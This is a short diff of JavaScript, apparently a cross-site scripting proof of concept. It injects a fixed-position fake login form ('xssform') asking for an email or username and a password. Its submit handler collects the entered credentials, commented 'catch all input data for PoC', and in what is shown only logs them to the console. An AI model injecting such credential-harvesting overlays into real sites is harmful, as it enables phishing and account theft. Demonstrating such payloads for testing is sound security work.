@@ -4,16 +4,16 @@ box.innerHTML = `
 
   <form id="xssform">
     <div>
-      <input type="email" name="username" class="" placeholder="Email address">
+      <input type="email" name="username" class="" placeholder="Email address or username">
       <input type="password" name="password" class="" placeholder="Password">
       <button id="xssbutton" type="submit" class="">Submit</button>
     </div>
   </form>
   
 `;
-box.setAttribute("z-index", "99999");
+
 box.style.position = "fixed";
-box.style.top = "50px";
+box.style.top = "70px";
 box.style.margin = "0 auto";
 box.style.background = "green";
 box.style.padding = "10px";
@@ -29,6 +29,7 @@ document.querySelector("#xssbutton").addEventListener("click", (e) => {
 	const formd = document.querySelector("#xssform");
 
 	console.log("button clicked!" )
+	// catch all input data for PoC
 	var data = new FormData(formd);
 	for (var [key, value] of data) {
 		console.log(key, value)
